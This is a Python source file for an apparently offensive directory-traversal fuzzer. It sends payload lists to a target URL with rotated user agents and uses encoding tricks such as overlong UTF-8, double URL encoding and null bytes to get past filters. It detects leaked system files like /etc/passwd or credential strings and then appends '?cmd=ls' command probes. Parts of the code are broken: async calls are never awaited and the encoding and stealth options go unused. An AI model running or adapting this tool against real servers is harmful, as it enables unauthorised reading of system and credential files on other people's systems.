import argparse
import requests
import urllib.parse
import re
import concurrent.futures
import random
import time
import logging
import platform
import aiohttp
import asyncio
from tqdm import tqdm
from threading import Lock

# Initialize logging
logging.basicConfig(filename="bray_traversal.log", level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class BrayTraversalAutomator:

    def __init__(self, base_url, payload_file='payloads.txt', user_agent_file='user_agents.txt', traversal_depth=10, os_detection=True, threads=10, success_criteria=None, encoding_methods=None, stealth=False, verbose=False, output_file=None, request_type='GET'):
        self.base_url = base_url
        self.payload_file = payload_file
        self.user_agent_file = user_agent_file
        self.traversal_depth = traversal_depth
        self.os_type = None
        self.server_type = None
        self.payloads = set()
        self.response_codes = {}
        self.os_detection = os_detection
        self.threads = threads
        self.success_criteria = success_criteria if success_criteria else ['root:', 'Administrator', 'NT AUTHORITY\\SYSTEM', 'uid=', 'gid=', 'password']
        self.encoding_methods = encoding_methods if encoding_methods else ['url', 'double_url', 'unicode', 'utf8_overlong', 'null_byte', 'hex', 'rot13', 'globbing', 'path_truncation', 'octal']
        self.stealth = stealth
        self.verbose = verbose
        self.output_file = output_file
        self.lock = Lock()
        self.request_type = request_type.upper()
        self.user_agents = []

    def detect_os_and_server(self):
        if self.os_detection:
            try:
                response = requests.get(self.base_url)
                server_header = response.headers.get('Server', '').lower()

                if platform.system().startswith("linux") or platform.system() == "darwin":
                    self.os_type = 'unix'
                elif platform.system().startswith("win"):
                    self.os_type = 'windows'

                if 'windows' in response.text.lower() or 'win32' in server_header:
                    self.os_type = 'windows'
                elif 'unix' in server_header or 'linux' in server_header:
                    self.os_type = 'unix'
                else:
                    self.os_type = 'unknown'

                if 'apache' in server_header:
                    self.server_type = 'Apache'
                elif 'nginx' in server_header:
                    self.server_type = 'Nginx'
                elif 'iis' in server_header:
                    self.server_type = 'IIS'
                elif 'wordpress' in server_header:
                    self.server_type = 'WordPress'
                elif 'wix' in server_header:
                    self.server_type = 'Wix'
                elif 'godaddy' in server_header:
                    self.server_type = 'GoDaddy'
                else:
                    self.server_type = 'Unknown'

                logging.info(f"Detected OS: {self.os_type}, Server: {self.server_type}")
            except Exception as e:
                self.os_type = 'unknown'
                self.server_type = 'unknown'
                logging.error(f"Error detecting OS and server: {e}")

    def encode_payload(self, payload, encoding_type):
        if encoding_type == 'url':
            return urllib.parse.quote(payload)
        elif encoding_type == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding_type == 'unicode':
            return payload.replace("/", "%c0%af").replace(".", "%c0%ae")
        elif encoding_type == 'utf8_overlong':
            return payload.replace("/", "%e0%80%af").replace(".", "%e0%80%ae")
        elif encoding_type == 'null_byte':
            return payload + '%00'
        elif encoding_type == 'hex':
            return ''.join([hex(ord(c))[2:] for c in payload])
        elif encoding_type == 'rot13':
            return payload.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
        elif encoding_type == 'globbing':
            return payload.replace("/", "/*/")
        elif encoding_type == 'path_truncation':
            return payload.replace("/etc/passwd", "/etc/./passwd")
        elif encoding_type == 'octal':
            return ''.join(['\\' + oct(ord(c))[2:] for c in payload])

    def load_payloads_from_file(self):
        with open(self.payload_file, 'r') as file:
            self.payloads = set(file.read().splitlines())
        logging.info(f"Loaded {len(self.payloads)} payloads from file")

    def load_user_agents(self):
        try:
            with open(self.user_agent_file, 'r') as file:
                self.user_agents = [line.strip() for line in file if line.strip()]
            logging.info(f"Loaded {len(self.user_agents)} user agents from file")
        except FileNotFoundError:
            logging.error(f"User agent file {self.user_agent_file} not found.")

    def fuzz_payloads(self):
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.fuzz_single_payload, payload) for payload in self.payloads]
            for future in concurrent.futures.as_completed(futures):
                future.result()

    async def fuzz_single_payload(self, payload):
        target_url = f"{self.base_url}/{payload}"
        try:
            start_time = time.time()
            async with aiohttp.ClientSession() as session:
                headers = {'User-Agent': random.choice(self.user_agents)} if self.user_agents else {}
                if self.request_type == 'GET':
                    async with session.get(target_url, headers=headers) as response:
                        await self.handle_response(response, payload, start_time)
                elif self.request_type == 'POST':
                    async with session.post(target_url, headers=headers) as response:
                        await self.handle_response(response, payload, start_time)
        except Exception as e:
            logging.error(f"Error fuzzing payload {payload}: {e}")

    async def handle_response(self, response, payload, start_time):
        response_time = time.time() - start_time
        self.response_codes[payload] = response.status

        if response.status == 200:
            self.color_print(f"Fuzzed {payload} - Response: {response.status} (Success)", 'green')
        else:
            self.color_print(f"Fuzzed {payload} - Response: {response.status} (Failed)", 'red')

        logging.info(f"Fuzzed {payload} - Response: {response.status}, Time: {response_time:.4f} seconds")
        await self.analyze_response(response, payload)

    async def analyze_response(self, response, payload):
        if response.status == 200:
            if any(re.search(criterion, await response.text(), re.IGNORECASE) for criterion in self.success_criteria):
                logging.info(f"Valid payload found: {payload}")
                await self.adapt_payload(payload)

    async def adapt_payload(self, payload):
        mutated_payloads = []
        for _ in range(3):
            random_obfuscation = f"{payload}?cmd=ls&random={random.randint(1000, 9999)}"
            mutated_payloads.append(random_obfuscation)
            await asyncio.sleep(random.uniform(0.1, 0.5))

        with self.lock:
            self.payloads.update(mutated_payloads)
        logging.info(f"Adapted and mutated payload: {payload}")

    def color_print(self, message, color):
        if color == 'green':
            print(f"\033[92m{message}\033[0m")
        elif color == 'red':
            print(f"\033[91m{message}\033[0m")

    def execute(self):
        self.detect_os_and_server()
        self.load_payloads_from_file()
        self.load_user_agents()

        if self.verbose:
            logging.info(f"Starting fuzzing with {len(self.payloads)} payloads")

        with tqdm(total=len(self.payloads), desc="Fuzzing", unit="payload") as pbar:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(self.fuzz_payloads_async(pbar))

        if self.output_file:
            self.save_results(self.output_file)

    async def fuzz_payloads_async(self, pbar):
        tasks = [self.fuzz_single_payload(payload) for payload in self.payloads]
        await asyncio.gather(*tasks)
        pbar.update(len(self.payloads))

    def save_results(self, file):
        with open(file, 'w') as f:
            for payload, code in self.response_codes.items():
                f.write(f"Payload: {payload}, Status Code: {code}\n")
        logging.info(f"Results saved to {file}")

    @staticmethod
    def prompt_user_for_url():
        while True:
            target_url = input("\033[92mEnter the target URL (with http/https): \033[0m").strip()
            if target_url.startswith("http://") or target_url.startswith("https://"):
                return target_url

def main():
    parser = argparse.ArgumentParser(description="Bray Traversal Automator")
    parser.add_argument('-u', '--url', required=True, help="Target URL to test")
    parser.add_argument('-T', '--threads', type=int, choices=[1, 2, 3, 4, 5], default=2, help="Number of threads (from T1 to T5)")
    parser.add_argument('-p', '--payloads', type=str, default='payloads.txt', help="File containing payloads to test")
    parser.add_argument('-a', '--user-agents', type=str, default='user_agents.txt', help="File containing user agents to use")
    parser.add_argument('-d', '--depth', type=int, default=10, help="Traversal depth (not currently utilized)")
    parser.add_argument('-sc', '--success-criteria', nargs='+', default=None, help="Success criteria for valid payloads")
    parser.add_argument('-e', '--encoding', nargs='+', default=['url'], help="Encoding methods to apply")
    parser.add_argument('-s', '--stealth', action='store_true', help="Enable stealth mode")
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose logging")
    parser.add_argument('-o', '--output', type=str, help="Output file to save results")
    parser.add_argument('-r', '--request-type', choices=['GET', 'POST'], default='GET', help="HTTP request type to use")
    args = parser.parse_args()

    # Initialize the BrayTraversalAutomator
    automator = BrayTraversalAutomator(
        base_url=args.url,
        payload_file=args.payloads,
        user_agent_file=args.user_agents,
        traversal_depth=args.depth,
        success_criteria=args.success_criteria,
        encoding_methods=args.encoding,
        stealth=args.stealth,
        verbose=args.verbose,
        output_file=args.output,
        request_type=args.request_type
    )

    automator.execute()

if __name__ == "__main__":
    main()
